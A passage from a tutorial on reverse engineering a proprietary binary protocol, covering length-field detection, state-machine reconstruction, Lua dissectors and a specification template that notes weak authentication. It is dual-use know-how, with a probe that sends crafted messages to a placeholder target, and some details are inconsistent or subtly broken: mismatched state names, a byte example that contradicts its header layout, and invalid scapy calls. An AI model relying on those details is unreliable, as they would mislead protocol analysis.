Variable-length: [0x81 0x50] → 336 bytes (continuation bit encoding)
```

### Identification Methodology

**Step 1: Capture Multiple Samples**

```bash
# Capture traffic from target protocol
sudo tcpdump -i eth0 -w protocol_samples.pcap port 12345

# Or use tshark with specific filters
tshark -i eth0 -f "tcp port 12345" -w samples.pcap
```

**Step 2: Extract Raw Payload Data**

```bash
# Extract TCP payload bytes
tshark -r protocol_samples.pcap -T fields -e tcp.payload | \
    grep -v "^$" > payloads_hex.txt

# Convert to binary for analysis
while read line; do
    echo "$line" | xxd -r -p >> payloads.bin
done < payloads_hex.txt
```

**Step 3: Statistical Pattern Analysis**

Create analysis script (`length_analyzer.py`):

```python
#!/usr/bin/env python3
import sys
from collections import Counter

def analyze_potential_length_fields(data, max_length_size=4):
    """
    Analyze binary data for potential length field patterns.
    """
    results = []
    
    for offset in range(len(data) - max_length_size):
        for size in [1, 2, 4]:  # Common length field sizes
            if offset + size > len(data):
                continue
                
            # Try big-endian
            length_be = int.from_bytes(data[offset:offset+size], 'big')
            # Try little-endian
            length_le = int.from_bytes(data[offset:offset+size], 'little')
            
            # Check if this could be a valid length field
            for length_val, endian in [(length_be, 'BE'), (length_le, 'LE')]:
                # Skip unrealistic values
                if length_val == 0 or length_val > len(data):
                    continue
                
                # Check if length matches remaining data
                remaining = len(data) - (offset + size)
                if length_val == remaining:
                    results.append({
                        'offset': offset,
                        'size': size,
                        'endian': endian,
                        'value': length_val,
                        'confidence': 'EXACT_MATCH'
                    })
                elif abs(length_val - remaining) < 10:
                    results.append({
                        'offset': offset,
                        'size': size,
                        'endian': endian,
                        'value': length_val,
                        'confidence': 'CLOSE_MATCH',
                        'diff': remaining - length_val
                    })
    
    return results

def main():
    if len(sys.argv) < 2:
        print("Usage: length_analyzer.py <binary_file>")
        sys.exit(1)
    
    with open(sys.argv[1], 'rb') as f:
        data = f.read()
    
    print(f"Analyzing {len(data)} bytes...")
    candidates = analyze_potential_length_fields(data)
    
    if candidates:
        print("\nPotential length fields found:")
        for c in candidates:
            print(f"  Offset {c['offset']:04x}: {c['size']}-byte {c['endian']} "
                  f"= {c['value']} (confidence: {c['confidence']})")
    else:
        print("No obvious length fields detected")

if __name__ == '__main__':
    main()
```

**Step 4: Manual Hex Analysis**

Using hexdump with correlation:

```bash
# Display with offset and ASCII
hexdump -C payloads.bin | less

# Look for patterns:
# Example output analysis:
# 00000000  00 00 00 2a 01 05 48 65  6c 6c 6f 57 6f 72 6c 64  |...*..HelloWorld|
#           ^^^^^^^^^ Potential 4-byte length = 42 bytes
#                    ^^ Message type?
#                       ^^ Flags?
#                          ^^^^^^^^^^^^^ Payload starts here
```

### Advanced Length Field Patterns

**Variable-Length Integer (VarInt)**

Common in protocols like Protocol Buffers, used to save space:

```python
def decode_varint(data, offset=0):
    """
    Decode variable-length integer (base-128 encoding).
    Most significant bit = continuation flag.
    """
    result = 0
    shift = 0
    pos = offset
    
    while True:
        if pos >= len(data):
            return None, pos
        
        byte = data[pos]
        result |= (byte & 0x7F) << shift
        pos += 1
        
        if (byte & 0x80) == 0:  # Continuation bit not set
            break
        
        shift += 7
    
    return result, pos

# Example usage
data = bytes([0x96, 0x01])  # Encodes 150
value, next_offset = decode_varint(data, 0)
print(f"Decoded value: {value}")  # Output: 150
```

Testing varint hypothesis:

```bash
# Extract potential varint sequences
tshark -r samples.pcap -T fields -e tcp.payload | \
    python3 -c "
import sys
for line in sys.stdin:
    data = bytes.fromhex(line.strip())
    # Test varint decoding at each offset
    "
```

**Null-Terminated vs Length-Prefixed Strings**

Detection script:

```python
def detect_string_encoding(data):
    """
    Determine if strings are length-prefixed or null-terminated.
    """
    findings = []
    
    # Check for null-terminated strings
    null_positions = [i for i, b in enumerate(data) if b == 0x00]
    if null_positions:
        # Check if data between nulls is printable
        for i in range(len(null_positions) - 1):
            start = null_positions[i] + 1
            end = null_positions[i + 1]
            segment = data[start:end]
            if segment and all(32 <= b < 127 for b in segment):
                findings.append(('NULL_TERM', start, segment))
    
    # Check for length-prefixed strings
    for i in range(len(data) - 1):
        length = data[i]
        if 0 < length < 100:  # Reasonable string length
            potential_string = data[i+1:i+1+length]
            if len(potential_string) == length:
                if all(32 <= b < 127 for b in potential_string):
                    findings.append(('LENGTH_PREFIX', i, potential_string))
    
    return findings
```

**Multi-Field Length Systems**

Some protocols use multiple length fields:

```
[Total Length: 2 bytes][Header Length: 1 byte][Payload Length: 2 bytes][Data...]

Example:
00 64  → Total message = 100 bytes
14     → Header = 20 bytes
00 50  → Payload = 80 bytes
[Header data: 20 bytes][Payload data: 80 bytes]
```

Analysis approach:

1. Calculate total packet size from capture
2. Check if sum of length fields equals total minus length field overhead
3. Verify consistency across multiple packets

### Wireshark Lua Dissector for Length Analysis

Create custom dissector to test length field hypothesis:

```lua
-- Save as length_test_dissector.lua
local test_proto = Proto("testproto", "Test Protocol Length Analysis")

local f_length = ProtoField.uint32("testproto.length", "Length Field", base.DEC)
local f_payload = ProtoField.bytes("testproto.payload", "Payload")

test_proto.fields = {f_length, f_payload}

function test_proto.dissector(buffer, pinfo, tree)
    pinfo.cols.protocol = "TEST"
    
    local subtree = tree:add(test_proto, buffer())
    
    -- Hypothesis: 4-byte big-endian length at offset 0
    if buffer:len() >= 4 then
        local length = buffer(0, 4):uint()
        subtree:add(f_length, buffer(0, 4))
        
        -- Verify length matches
        local expected_total = length + 4  -- Length field + payload
        if buffer:len() == expected_total then
            subtree:append_text(" [LENGTH VALID]")
        else
            subtree:append_text(string.format(" [LENGTH MISMATCH: expected %d, got %d]", 
                expected_total, buffer:len()))
        end
        
        if buffer:len() > 4 then
            subtree:add(f_payload, buffer(4))
        end
    end
end

-- Register for specific port
local tcp_table = DissectorTable.get("tcp.port")
tcp_table:add(12345, test_proto)
```

Load and test:

```bash
wireshark -X lua_script:length_test_dissector.lua samples.pcap
```

### Handling Fragmentation and Reassembly

**TCP Segmentation Detection**:

```python
def detect_fragmented_messages(pcap_file):
    """
    Identify when protocol messages span multiple TCP segments.
    [Inference] This pattern suggests length-based reassembly is needed.
    """
    from scapy.all import rdpcap, TCP
    
    packets = rdpcap(pcap_file)
    streams = {}
    
    for pkt in packets:
        if TCP in pkt:
            stream_id = (pkt[TCP].sport, pkt[TCP].dport)
            if stream_id not in streams:
                streams[stream_id] = []
            
            if pkt[TCP].payload:
                payload = bytes(pkt[TCP].payload)
                streams[stream_id].append({
                    'seq': pkt[TCP].seq,
                    'len': len(payload),
                    'data': payload
                })
    
    # Analyze for fragmentation patterns
    for stream_id, segments in streams.items():
        print(f"\nStream {stream_id}:")
        for seg in segments:
            print(f"  SEQ {seg['seq']:08x}: {seg['len']} bytes")
            # Check first few bytes for length field
            if seg['len'] >= 4:
                potential_length = int.from_bytes(seg['data'][:4], 'big')
                if potential_length > seg['len']:
                    print(f"    -> Indicates fragmentation (length field = {potential_length})")
```

**Reassembly Strategy**:

```python
class MessageReassembler:
    def __init__(self):
        self.buffer = b''
        self.expected_length = None
    
    def feed(self, data):
        """
        Feed TCP segment data, return complete messages.
        """
        self.buffer += data
        messages = []
        
        while True:
            # Need at least length field
            if self.expected_length is None and len(self.buffer) >= 4:
                self.expected_length = int.from_bytes(self.buffer[:4], 'big')
            
            # Check if we have complete message
            if self.expected_length and len(self.buffer) >= self.expected_length + 4:
                message = self.buffer[4:4+self.expected_length]
                messages.append(message)
                
                # Remove processed message from buffer
                self.buffer = self.buffer[4+self.expected_length:]
                self.expected_length = None
            else:
                break
        
        return messages
```

### Validation Techniques

**Cross-Packet Correlation**:

```bash
# Extract all packets to individual files
tshark -r samples.pcap -T fields -e tcp.payload -e frame.number | \
while read payload frame; do
    echo "$payload" | xxd -r -p > "packet_${frame}.bin"
done

# Analyze length field consistency
for f in packet_*.bin; do
    echo -n "$f: "
    # Extract suspected length field (offset 0, 4 bytes, big-endian)
    xxd -p -l 4 "$f" | xargs printf "%d\n" | python3 -c "
import sys
hex_val = input().strip()
dec_val = int(hex_val, 16)
print(f'{dec_val} (0x{hex_val})')
"
    # Compare with actual file size minus header
    actual=$(stat -f%z "$f" 2>/dev/null || stat -c%s "$f")
    echo "  Actual payload size: $((actual - 4))"
done
```

**Checksum Verification**: [Inference] Some protocols include checksums that cover the length field, helping validate your analysis:

```python
def verify_length_with_checksum(data, length_offset=0, length_size=4, 
                                 checksum_offset=None):
    """
    If protocol includes checksum, use it to validate length field location.
    """
    import struct
    import zlib
    
    length = struct.unpack('>I', data[length_offset:length_offset+length_size])[0]
    
    # Hypothesis: checksum covers length + payload
    if checksum_offset:
        checksum_data = data[length_offset:checksum_offset]
        computed = zlib.crc32(checksum_data) & 0xFFFFFFFF
        stored = struct.unpack('>I', data[checksum_offset:checksum_offset+4])[0]
        
        if computed == stored:
            return True, "Checksum validates length field position"
        else:
            return False, f"Checksum mismatch: {computed:08x} != {stored:08x}"
    
    return None, "No checksum available for validation"
```

## State Machine Reconstruction

### Protocol State Machine Fundamentals

**State Machine Components**:

- **States**: Distinct phases of protocol operation (IDLE, CONNECTED, AUTHENTICATED, etc.)
- **Transitions**: Events causing state changes (packet types, timeouts)
- **Actions**: Operations performed during transitions (send response, store data)
- **Guards**: Conditions that must be met for transitions

**Common Protocol State Patterns**:

```
Simple Request-Response:
  IDLE → (send request) → WAITING → (receive response) → IDLE

Connection-Oriented:
  CLOSED → (SYN) → SYN_SENT → (SYN-ACK) → ESTABLISHED → (FIN) → CLOSED

Multi-Stage Authentication:
  UNAUTHENTICATED → (send credentials) → CHALLENGE_SENT → 
  (response) → VERIFIED → (token) → AUTHENTICATED
```

### Traffic Collection for State Analysis

**Capture Complete Sessions**:

```bash
# Capture with connection tracking
tshark -i eth0 -f "tcp port 9999" -w full_session.pcap

# Or capture multiple sessions
timeout 300 tcpdump -i eth0 -w multi_session.pcap port 9999

# Extract only successful complete sessions (with FIN)
tshark -r multi_session.pcap -Y "tcp.flags.fin == 1" \
    -T fields -e tcp.stream | sort -u > complete_streams.txt

# Extract each complete stream
while read stream_id; do
    tshark -r multi_session.pcap -Y "tcp.stream == $stream_id" \
        -w "stream_${stream_id}.pcap"
done < complete_streams.txt
```

### State Extraction Methodology

**Step 1: Identify Message Types**

Message type indicators often appear in consistent positions:

```python
#!/usr/bin/env python3
from scapy.all import rdpcap, TCP
from collections import Counter, defaultdict

def extract_message_types(pcap_file, type_offset=0, type_length=1):
    """
    Extract potential message type indicators from payload.
    """
    packets = rdpcap(pcap_file)
    type_counts = Counter()
    type_examples = defaultdict(list)
    
    for pkt in packets:
        if TCP in pkt and pkt[TCP].payload:
            payload = bytes(pkt[TCP].payload)
            if len(payload) > type_offset + type_length:
                msg_type = payload[type_offset:type_offset+type_length]
                type_counts[msg_type] += 1
                
                # Store first few examples
                if len(type_examples[msg_type]) < 3:
                    type_examples[msg_type].append(payload[:32])  # First 32 bytes
    
    print("Message Type Distribution:")
    for msg_type, count in type_counts.most_common():
        print(f"  Type 0x{msg_type.hex()}: {count} occurrences")
        print("    Examples:")
        for example in type_examples[msg_type][:2]:
            print(f"      {example.hex()}")
    
    return type_counts, type_examples

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print("Usage: extract_message_types.py <pcap_file>")
        sys.exit(1)
    
    extract_message_types(sys.argv[1])
```

**Step 2: Sequence Analysis**

Track message flow patterns:

```python
def analyze_message_sequences(pcap_file, type_offset=0):
    """
    Build sequences of message types to identify state transitions.
    """
    from scapy.all import rdpcap, TCP, IP
    
    packets = rdpcap(pcap_file)
    streams = defaultdict(list)
    
    for pkt in packets:
        if TCP in pkt and IP in pkt and pkt[TCP].payload:
            stream_id = (pkt[IP].src, pkt[TCP].sport, pkt[IP].dst, pkt[TCP].dport)
            payload = bytes(pkt[TCP].payload)
            
            if len(payload) > type_offset:
                msg_type = payload[type_offset]
                direction = 'C->S' if stream_id[1] < stream_id[3] else 'S->C'
                
                streams[stream_id].append({
                    'type': msg_type,
                    'direction': direction,
                    'timestamp': float(pkt.time),
                    'size': len(payload)
                })
    
    # Analyze sequences
    print("\nMessage Sequences per Stream:")
    for stream_id, messages in streams.items():
        print(f"\nStream {stream_id[0]}:{stream_id[1]} -> {stream_id[2]}:{stream_id[3]}")
        sequence = ' -> '.join([f"{m['direction']}:0x{m['type']:02x}" 
                                for m in messages])
        print(f"  Sequence: {sequence}")
        
        # Calculate timing between messages
        for i in range(len(messages) - 1):
            delta = messages[i+1]['timestamp'] - messages[i]['timestamp']
            if delta > 5.0:
                print(f"    [!] Large gap ({delta:.2f}s) after message {i}")

if __name__ == '__main__':
    import sys
    analyze_message_sequences(sys.argv[1])
```

**Step 3: Build State Transition Table**

Create transition matrix:

```python
from collections import defaultdict

class StateReconstructor:
    def __init__(self):
        self.transitions = defaultdict(lambda: defaultdict(int))
        self.state_labels = {}
        self.next_state_id = 0
    
    def add_sequence(self, message_types):
        """
        Add observed message sequence to transition table.
        """
        current_state = 'INITIAL'
        
        for msg_type in message_types:
            # Transition key: (current_state, message_type)
            next_state = self._get_or_create_state(current_state, msg_type)
            self.transitions[current_state][msg_type] += 1
            current_state = next_state
    
    def _get_or_create_state(self, from_state, on_message):
        """
        Determine next state based on transition.
        """
        # Simple heuristic: unique state for each (state, message) pair
        state_key = f"{from_state}_{on_message:02x}"
        if state_key not in self.state_labels:
            self.state_labels[state_key] = f"STATE_{self.next_state_id}"
            self.next_state_id += 1
        return self.state_labels[state_key]
    
    def print_transitions(self):
        """
        Display state transition table.
        """
        print("\nState Transition Table:")
        for from_state, transitions in self.transitions.items():
            print(f"\n  From {from_state}:")
            for msg_type, count in transitions.items():
                to_state = self._get_or_create_state(from_state, msg_type)
                print(f"    On message 0x{msg_type:02x} -> {to_state} ({count} times)")
    
    def generate_dot(self):
        """
        Generate GraphViz DOT format for visualization.
        """
        dot = ["digraph StateMachine {", "  rankdir=LR;"]
        
        for from_state, transitions in self.transitions.items():
            for msg_type, count in transitions.items():
                to_state = self._get_or_create_state(from_state, msg_type)
                label = f"0x{msg_type:02x}\\n({count})"
                dot.append(f'  "{from_state}" -> "{to_state}" [label="{label}"];')
        
        dot.append("}")
        return '\n'.join(dot)

# Usage example
reconstructor = StateReconstructor()

# Feed sequences from multiple streams
sequences = [
    [0x01, 0x02, 0x03, 0x04],  # Stream 1
    [0x01, 0x02, 0x03, 0x04],  # Stream 2 (same pattern)
    [0x01, 0x05, 0x06],        # Stream 3 (error case?)
]

for seq in sequences:
    reconstructor.add_sequence(seq)

reconstructor.print_transitions()

# Generate visualization
with open('state_machine.dot', 'w') as f:
    f.write(reconstructor.generate_dot())

# Convert to image
# dot -Tpng state_machine.dot -o state_machine.png
```

### Advanced State Inference Techniques

**Timeout-Based Transitions**

Some states change based on inactivity:

```python
def detect_timeout_transitions(pcap_file, threshold=30.0):
    """
    [Inference] Identify potential timeout-driven state changes.
    """
    from scapy.all import rdpcap, TCP
    
    packets = rdpcap(pcap_file)
    streams = defaultdict(list)
    
    for pkt in packets:
        if TCP in pkt and pkt[TCP].payload:
            stream = pkt[TCP].stream
            streams[stream].append(float(pkt.time))
    
    timeout_events = []
    
    for stream, timestamps in streams.items():
        for i in range(len(timestamps) - 1):
            gap = timestamps[i+1] - timestamps[i]
            if gap > threshold:
                timeout_events.append({
                    'stream': stream,
                    'after_packet': i,
                    'gap': gap,
                    'timestamp': timestamps[i]
                })
    
    print(f"\nDetected {len(timeout_events)} potential timeout transitions:")
    for event in timeout_events:
        print(f"  Stream {event['stream']}, packet {event['after_packet']}: "
              f"{event['gap']:.2f}s gap")
    
    return timeout_events
```

**Error State Detection**

Identify abnormal sequences that indicate error states:

```python
def identify_error_patterns(sequences):
    """
    [Inference] Detect sequences that deviate from normal flow.
    """
    from collections import Counter
    
    # Assume most common sequence is normal
    sequence_strs = [tuple(seq) for seq in sequences]
    counts = Counter(sequence_strs)
    
    normal_sequence = counts.most_common(1)[0][0]
    print(f"Normal sequence: {' -> '.join(f'0x{m:02x}' for m in normal_sequence)}")
    
    print("\nDeviant sequences (potential error states):")
    for seq, count in counts.items():
        if seq != normal_sequence:
            print(f"  {' -> '.join(f'0x{m:02x}' for m in seq)}: {count} occurrences")
            
            # Identify where it diverges
            for i, (normal, actual) in enumerate(zip(normal_sequence, seq)):
                if normal != actual:
                    print(f"    Diverges at position {i}: "
                          f"expected 0x{normal:02x}, got 0x{actual:02x}")
                    break
```

**State Variable Tracking**

Some protocols maintain state in specific fields:

```python
def track_state_variables(pcap_file, var_offset=4, var_length=4):
    """
    Track fields that may represent internal state variables.
    """
    from scapy.all import rdpcap, TCP
    
    packets = rdpcap(pcap_file)
    state_values = []
    
    for pkt in packets:
        if TCP in pkt and pkt[TCP].payload:
            payload = bytes(pkt[TCP].payload)
            if len(payload) >= var_offset + var_length:
                state_val = int.from_bytes(
                    payload[var_offset:var_offset+var_length], 'big')
                state_values.append(state_val)
    
    print("State variable progression:")
    for i, val in enumerate(state_values):
        print(f"  Packet {i}: 0x{val:08x} ({val})")
        if i > 0 and val != state_values[i-1]:
            print(f"    -> State change detected")
```

### Validation with Active Testing

[Inference] After reconstructing state machine, validate by attempting to reproduce transitions:

```python
import socket

def test_state_transition(host, port, sequence):
    """
    Test hypothesized state machine by sending message sequence.
    [Unverified] This assumes connection-oriented protocol and may require
    adaptation for specific protocols.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    print("Testing sequence:", [f"0x{m:02x}" for m in sequence])
    
    try:
        for i, msg_type in enumerate(sequence):
            # Construct minimal message (adjust based on protocol)
            message = bytes([msg_type]) + b'\x00' * 15  # Placeholder
            sock.send(message)
            print(f"  Sent message {i}: 0x{msg_type:02x}")
            
            # Receive response
            response = sock.recv(4096)
            if response:
                print(f"    Received: {response[:16].hex()}")
            else:
                print(f"    No response (connection closed?)")
                break
    except Exception as e:
        print(f"  Error: {e}")
    finally:
        sock.close()

# Test normal sequence
test_state_transition('target.example.com', 9999, [0x01, 0x02, 0x03])

# Test deviant sequence to trigger error state
test_state_transition('target.example.com', 9999, [0x01, 0x05])
```

## Documentation Creation

### Protocol Specification Template

Create structured documentation in Markdown format:

```markdown
# Unknown Protocol v1.0 - Reverse Engineered Specification

## Overview
- **Protocol Name**: [Assigned name or identifier]
- **Transport**: TCP/UDP/Other
- **Default Port**: [Port number]
- **Byte Order**: Big-endian / Little-endian
- **Analysis Date**: [Date]
- **Confidence Level**: [High/Medium/Low with justification]

## Message Format

### Header Structure
``
0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Version | Message Type | Length | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Sequence Number | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Payload | | (variable) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
``

### Field Descriptions

| Field | Offset | Size | Type | Description |
|-------|--------|------|------|-------------|
| Version | 0 | 1 byte | uint8 | Protocol version (observed: 0x01) |
| Message Type | 1 | 1 byte | uint8 | See Message Types table |
| Length | 2 | 2 bytes | uint16 (BE) | Payload length in bytes |
| Sequence Number | 4 | 4 bytes | uint32 (BE) | Incremental counter per connection |
| Payload | 8 | Variable | bytes | Message-specific data |

## Message Types

| Value | Name | Direction | Description |
|-------|------|-----------|-------------|
| 0x01 | HELLO | C->S | Initial connection message |
| 0x02 | HELLO_ACK | S->C | Server acknowledgment |
| 0x03 | AUTH_REQUEST | C->S | Authentication credentials |
| 0x04 | AUTH_SUCCESS | S->C | Authentication succeeded |
| 0x05 | AUTH_FAILURE | S->C | Authentication failed |
| 0x10 | DATA | Bidirectional | Application data transfer |
| 0xFF | CLOSE | Bidirectional | Connection termination |

## State Machine

``

[INITIAL] | | (send HELLO) v [WAIT_HELLO_ACK] | | (receive HELLO_ACK) v [CONNECTED] | | (send AUTH_REQUEST) v [WAIT_AUTH_RESPONSE] | +-- (receive AUTH_SUCCESS) --> [AUTHENTICATED] | | +-- (receive AUTH_FAILURE) -----+ | (DATA exchange) | | v v [CLOSED] <-- (CLOSE)

``

### Transition Rules

| From State       | Message      | Guard Conditions | To State          | Actions                                                                 |
|------------------|--------------|------------------|-------------------|-------------------------------------------------------------------------|
| INITIAL          | HELLO        | -                | WAIT_HELLO         |                                                                         |
| WAIT_HELLO       | HELLO_ACK    | Valid session ID | CONNECTED         | Initialize sequence counter                                              |
| CONNECTED        | AUTH_REQUEST | -                | WAIT_AUTH_RESPONSE | Store credentials                                                       |
| WAIT_AUTH_RESPONSE| AUTH_SUCCESS  | Valid token      | AUTHENTICATED     | Store auth token                                                        |
| WAIT_AUTH_RESPONSE| AUTH_FAILURE  | -                | CLOSED            | Terminate connection                                                     |
| AUTHENTICATED    | DATA         | Sequence valid   | AUTHENTICATED     | Process data, increment seq                                             |
| AUTHENTICATED    | CLOSE        | -                | CLOSED            | Cleanup session                                                          |
## Detailed Message Specifications

### HELLO (0x01)

**Purpose**: Initiate connection with server

**Payload Structure**:

``
Offset | Size | Field Name    | Type   | Description
-------|------|---------------|--------|---------------------------
0      | 4    | Client ID     | uint32 | Unique client identifier
4      | 2    | Protocol Ver  | uint16 | Requested protocol version
6      | 16   | Session Token | bytes  | Reserved for reconnection
``

**Example**:

``
01 00 00 14 12 34 56 78 00 01 00 00 00 00 00 00
^^ Message Type
   ^^^^^ Length (20 bytes)
         ^^^^^^^^^ Client ID (0x12345678)
                  ^^^^^ Protocol Version (1)
                        ^^^^^^^^^^^^^^^^^^^^^ Session Token
``

**Observations**:

- [Verified] Session token all zeros for initial connection
- [Inference] Non-zero session token may allow reconnection
- Client ID appears randomly generated per session

### HELLO_ACK (0x02)

**Purpose**: Acknowledge connection, provide session info

**Payload Structure**:

``
Offset | Size | Field Name      | Type   | Description
-------|------|-----------------|--------|---------------------------
0      | 16   | Session Token   | bytes  | Server-assigned session ID
16     | 4    | Server Time     | uint32 | Unix timestamp
20     | 2    | Max Msg Size    | uint16 | Maximum message length
22     | 1    | Capabilities    | bitmap | Feature flags
``

**Capability Flags**:

- Bit 0: Compression supported
- Bit 1: Encryption available
- Bit 2: File transfer enabled
- Bit 3-7: Reserved

### AUTH_REQUEST (0x03)

**Purpose**: Submit authentication credentials

**Payload Structure**:

``
Offset | Size | Field Name       | Type   | Description
-------|------|------------------|--------|---------------------------
0      | 1    | Auth Method      | uint8  | 0x01=password, 0x02=token
1      | 1    | Username Length  | uint8  | Length of username field
2      | var  | Username         | string | UTF-8 username
var    | 1    | Credential Len   | uint8  | Length of credential
var+1  | var  | Credential       | bytes  | Password hash or token
``

**Auth Methods**:

- 0x01: Password (SHA-256 hash)
- 0x02: Pre-shared token
- [Unverified] 0x03: May be certificate-based

**Example (password auth)**:

``
03 00 00 42 01 05 61 64 6d 69 6e 20 e3 b0 c4 42...
^^ Type
   ^^^^^ Length (66 bytes)
         ^^ Method (password)
            ^^ Username length (5)
               ^^^^^^^^^^^ Username "admin"
                           ^^ Credential length (32)
                              ^^^^^^^^^ SHA-256 hash
``

### AUTH_SUCCESS (0x04)

**Purpose**: Confirm authentication, provide token

**Payload Structure**:

``
Offset | Size | Field Name     | Type   | Description
-------|------|----------------|--------|---------------------------
0      | 32   | Auth Token     | bytes  | Session authentication token
32     | 4    | Token Expiry   | uint32 | Unix timestamp for expiration
36     | 1    | User Level     | uint8  | Permission level (0-255)
``

### DATA (0x10)

**Purpose**: Transfer application data

**Payload Structure**:

``
Offset | Size | Field Name     | Type   | Description
-------|------|----------------|--------|---------------------------
0      | 1    | Data Type      | uint8  | Content type indicator
1      | 1    | Flags          | bitmap | Compression, encryption flags
2      | var  | Data           | bytes  | Actual payload
``

**Data Type Values**:

- 0x01: Plain text
- 0x02: Binary file
- 0x03: JSON structure
- 0x04: Compressed data
- [Inference] 0x05-0xFF: Reserved or application-specific

## Protocol Flow Examples

### Successful Connection and Authentication

``
Client                                Server
  |                                      |
  |------ HELLO (0x01) ----------------->|
  |       [Client ID: 0x12345678]        |
  |                                      |
  |<----- HELLO_ACK (0x02) --------------|
  |       [Session Token: 0xabcd...]     |
  |                                      |
  |------ AUTH_REQUEST (0x03) ---------->|
  |       [Method: Password]             |
  |       [Username: "admin"]            |
  |                                      |
  |<----- AUTH_SUCCESS (0x04) -----------|
  |       [Auth Token: 0xef01...]        |
  |                                      |
  |------ DATA (0x10) ------------------>|
  |       [Type: Text]                   |
  |                                      |
  |<----- DATA (0x10) -------------------|
  |       [Type: JSON]                   |
  |                                      |
  |------ CLOSE (0xFF) ----------------->|
  |                                      |
``

### Failed Authentication

``
Client                                Server
  |                                      |
  |------ HELLO (0x01) ----------------->|
  |                                      |
  |<----- HELLO_ACK (0x02) --------------|
  |                                      |
  |------ AUTH_REQUEST (0x03) ---------->|
  |       [Invalid credentials]          |
  |                                      |
  |<----- AUTH_FAILURE (0x05) -----------|
  |                                      |
  |<----- CLOSE (0xFF) ------------------|
  |       [Connection terminated]        |
  |                                      |
``

## Security Considerations

### Observed Security Mechanisms

1. **Authentication**:
    - [Verified] Password transmitted as SHA-256 hash
    - [Inference] No salt observed; vulnerable to rainbow tables
    - Session tokens appear to be 128-bit random values
2. **Encryption**:
    - [Unverified] No TLS wrapper observed in test captures
    - Capability flag suggests optional encryption
    - [Inference] May use application-layer encryption when bit 1 set
3. **Replay Protection**:
    - [Verified] Sequence numbers increment per message
    - [Inference] Server likely validates sequence progression

### Vulnerabilities

[Inference] Based on observed traffic patterns:

1. **Authentication Weakness**:
    
    - Unsalted password hashes vulnerable to precomputation attacks
    - No challenge-response mechanism observed
2. **Session Security**:
    
    - Session tokens transmitted in cleartext
    - No observed token rotation mechanism
3. **Lack of Encryption**:
    
    - All data transmitted in plaintext in observed sessions
    - Credentials and sensitive data exposed

## Implementation Guide

### Wireshark Dissector

Complete Lua dissector for analysis:

```lua
-- Save as unknown_protocol.lua
local proto_unknown = Proto("UKPROTO", "Unknown Protocol")

-- Protocol fields
local f_version = ProtoField.uint8("ukproto.version", "Version", base.HEX)
local f_msgtype = ProtoField.uint8("ukproto.msgtype", "Message Type", base.HEX, {
    [0x01] = "HELLO",
    [0x02] = "HELLO_ACK",
    [0x03] = "AUTH_REQUEST",
    [0x04] = "AUTH_SUCCESS",
    [0x05] = "AUTH_FAILURE",
    [0x10] = "DATA",
    [0xFF] = "CLOSE"
})
local f_length = ProtoField.uint16("ukproto.length", "Payload Length", base.DEC)
local f_seqnum = ProtoField.uint32("ukproto.seqnum", "Sequence Number", base.DEC)
local f_payload = ProtoField.bytes("ukproto.payload", "Payload")

-- HELLO-specific fields
local f_client_id = ProtoField.uint32("ukproto.client_id", "Client ID", base.HEX)
local f_proto_ver = ProtoField.uint16("ukproto.proto_ver", "Protocol Version", base.DEC)
local f_session_token = ProtoField.bytes("ukproto.session_token", "Session Token")

-- AUTH fields
local f_auth_method = ProtoField.uint8("ukproto.auth_method", "Auth Method", base.HEX, {
    [0x01] = "Password",
    [0x02] = "Token"
})
local f_username_len = ProtoField.uint8("ukproto.username_len", "Username Length", base.DEC)
local f_username = ProtoField.string("ukproto.username", "Username")
local f_cred_len = ProtoField.uint8("ukproto.cred_len", "Credential Length", base.DEC)
local f_credential = ProtoField.bytes("ukproto.credential", "Credential")

proto_unknown.fields = {
    f_version, f_msgtype, f_length, f_seqnum, f_payload,
    f_client_id, f_proto_ver, f_session_token,
    f_auth_method, f_username_len, f_username, f_cred_len, f_credential
}

function proto_unknown.dissector(buffer, pinfo, tree)
    local length = buffer:len()
    if length < 8 then return end
    
    pinfo.cols.protocol = proto_unknown.name
    
    local subtree = tree:add(proto_unknown, buffer())
    
    -- Header
    subtree:add(f_version, buffer(0, 1))
    local msgtype = buffer(1, 1):uint()
    subtree:add(f_msgtype, buffer(1, 1))
    subtree:add(f_length, buffer(2, 2))
    subtree:add(f_seqnum, buffer(4, 4))
    
    -- Set info column
    local msgtype_names = {
        [0x01] = "HELLO",
        [0x02] = "HELLO_ACK",
        [0x03] = "AUTH_REQUEST",
        [0x04] = "AUTH_SUCCESS",
        [0x05] = "AUTH_FAILURE",
        [0x10] = "DATA",
        [0xFF] = "CLOSE"
    }
    pinfo.cols.info = msgtype_names[msgtype] or "Unknown"
    
    -- Payload parsing based on message type
    if length > 8 then
        local payload = buffer(8)
        local payload_tree = subtree:add(f_payload, payload)
        
        if msgtype == 0x01 then  -- HELLO
            if payload:len() >= 22 then
                payload_tree:add(f_client_id, payload(0, 4))
                payload_tree:add(f_proto_ver, payload(4, 2))
                payload_tree:add(f_session_token, payload(6, 16))
            end
            
        elseif msgtype == 0x03 then  -- AUTH_REQUEST
            if payload:len() >= 2 then
                payload_tree:add(f_auth_method, payload(0, 1))
                local username_len = payload(1, 1):uint()
                payload_tree:add(f_username_len, payload(1, 1))
                
                if payload:len() >= 2 + username_len then
                    payload_tree:add(f_username, payload(2, username_len))
                    
                    local cred_offset = 2 + username_len
                    if payload:len() > cred_offset then
                        local cred_len = payload(cred_offset, 1):uint()
                        payload_tree:add(f_cred_len, payload(cred_offset, 1))
                        
                        if payload:len() >= cred_offset + 1 + cred_len then
                            payload_tree:add(f_credential, 
                                payload(cred_offset + 1, cred_len))
                        end
                    end
                end
            end
        end
    end
end

-- Register dissector
local tcp_port = DissectorTable.get("tcp.port")
tcp_port:add(9999, proto_unknown)  -- Adjust port as needed
``

### Python Client Implementation

```python
#!/usr/bin/env python3
"""
Client implementation for unknown protocol.
